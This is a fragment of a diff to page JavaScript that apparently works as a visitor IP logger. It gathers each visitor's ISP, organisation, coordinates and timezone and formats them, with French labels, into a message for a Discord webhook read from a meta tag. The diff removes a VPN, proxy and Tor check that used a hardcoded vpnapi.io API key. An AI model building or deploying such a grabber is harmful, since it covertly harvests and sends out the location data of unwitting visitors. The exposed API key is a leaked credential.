@@ -37,13 +37,6 @@
         const isp = data.connection.isp_name
         const organame = data.connection.organization_name
         
-              $.getJSON("https://vpnapi.io/api/?key=65cc98cf85ec414ea0faaf4e55e8e733", function (data) {
-        // display the IP address on the page
-        const vpn = data.security.vpn
-        const proxy = data.security.proxy
-        const tor = data.security.tor
-        const relay = data.security.relay
-
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
   // create the embed message
@@ -62,9 +55,6 @@
       ID Geo du Continent: ${continentgeo}
       X: ${longitude}
       Y: ${latitude}
-      Utilise un VPN? : ${vpn}
-      Utilise un Proxy? : ${proxy}
-      Utilise Tor? : ${tor}
       Nom du TimeZone: ${timezonename}
       Raccourci du TimeZone: ${nameabbreviation}
       Heure Actuel: ${currentime}3
